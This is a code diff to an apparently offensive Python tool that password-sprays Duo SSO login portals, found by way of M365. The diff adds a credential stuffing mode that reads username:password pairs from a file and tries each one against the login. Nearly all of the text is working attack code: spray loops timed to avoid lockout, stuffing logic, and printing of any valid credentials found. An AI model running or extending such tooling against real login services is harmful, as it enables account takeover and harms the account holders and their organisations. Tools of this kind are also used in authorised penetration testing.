@@ -23,6 +23,7 @@ no_delay_mode = False
 duo_current_url = ''
 username_file = 'userlist.txt'
 password_file = 'passwords.txt'
+credstuffing_file = ''
 valid_credentials = []
 
 
@@ -48,6 +49,7 @@ def help_menu():
     print("Optional Options:")
     print(f"    -u:\t Username file (defaults to userlist.txt in the current folder)")
     print(f"    -p:\t Username file (defaults to passwords.txt in the current folder)")
+    print(f"    -s:\t Credential stuffing mode, specify file name with credentials in username:password format")
     print(f"    -U:\t URL of Duo SSO Portal (defaults to using M365 to find the Duo login page)")
     print(f"    -d:\t Delay between unique passwords in minutes (defaults to 30 minutes)")
     print(f"    -nd:\t No delay between unique passwords (be careful)")
@@ -185,12 +187,14 @@ def attempt_login(l_username, l_password):
             valid_url = False
 
 
-def print_beginning():
+def print_beginning_spray():
     print(f"Parameters:")
     print(f"Username File:\t\t\t\t{username_file}")
     print(f"Password File:\t\t\t\t{password_file}")
     print(f"Delay Between Passwords:\t{delay_between_spray}\n")
 
+def print_beginning_stuffing():
+    print(f"Starting credential stuffing with file {credstuffing_file}")
 
 def print_end(l_valid_credentials):
     print(f"\n")  # This could be built out in the future
@@ -215,6 +219,8 @@ for index, argument in enumerate(sys.argv[1:]):
         no_delay_mode = True
     elif argument == "-p" or argument == "--password":
         password_file = sys.argv[index + 2]
+    elif argument == "-s" or argument == "--stuffing":
+        credstuffing_file = sys.argv[index + 2]
     elif argument == "-u" or argument == "--username":
         username_file = sys.argv[index + 2]
     elif argument == "-U" or argument == "--url":
@@ -222,25 +228,45 @@ for index, argument in enumerate(sys.argv[1:]):
     elif sys.argv[index] in {'-d', '-r', '-n', '-o'}:
         pass
 
-print_beginning()
+# Iterate through passwords in the password file if password spraying.
+if credstuffing_file == '':
+    print_beginning_spray()
 
-# Iterate through passwords in the password file.
-with open(password_file) as password_file_reader:
-    while password := password_file_reader.readline():
-        print(f"Password spray with password {password.rstrip()} beginning:")
-        # Check what time the spray is starting, and then set the time for the next spray to start.
-        next_start_time = datetime.now() + timedelta(minutes=delay_between_spray)
-        # Iterate through usernames in the username file
-        with open(username_file) as file_file_reader:
-            while username := file_file_reader.readline():
+    with open(password_file) as password_file_reader:
+        while password := password_file_reader.readline():
+            print(f"Password spray with password {password.rstrip()} beginning:")
+            # Check what time the spray is starting, and then set the time for the next spray to start.
+            next_start_time = datetime.now() + timedelta(minutes=delay_between_spray)
+            # Iterate through usernames in the username file
+            with open(username_file) as file_file_reader:
+                while username := file_file_reader.readline():
+                    attempt_login(username.rstrip(), password.rstrip())
+            print(f"Password spray with password {password.rstrip()} complete. {len(valid_credentials)} credentials found.")
+            # Print valid credentials if any were found.
+            for valid_cred in valid_credentials:
+                print(f"{valid_cred[0]} - {valid_cred[1]}")
+            # Wait until the next spray attempt, if a delay has been set or if left to the default of 30 minutes
+            if not no_delay_mode:
+                print(f"Waiting until {next_start_time} to start the next spray.")
+                pause.until(next_start_time)
+else:
+    # If a credential stuffing file was specified, use that
+    print_beginning_stuffing()
+
+    with open(credstuffing_file) as credentialstuffing_file_reader:
+        for user_pass_pair in credentialstuffing_file_reader:
+            # Strip whitespace and newline characters
+            user_pass_pair = user_pass_pair.strip()
+
+            # Split the line into username and password, then test them
+            if ':' in user_pass_pair:  # Ensure the line has a colon
+                username, password = user_pass_pair.split(':', 1)  # Split on the first colon
                 attempt_login(username.rstrip(), password.rstrip())
-        print(f"Password spray with password {password.rstrip()} complete. {len(valid_credentials)} credentials found.")
+
+        print(f"Credential stuffing with file {credstuffing_file} complete. {len(valid_credentials)} credentials found.")
         # Print valid credentials if any were found.
         for valid_cred in valid_credentials:
             print(f"{valid_cred[0]} - {valid_cred[1]}")
-        # Wait until the next spray attempt, if a delay has been set or if left to the default of 30 minutes
-        if not no_delay_mode:
-            print(f"Waiting until {next_start_time} to start the next spray.")
-            pause.until(next_start_time)
+
 
 print_end(valid_credentials)
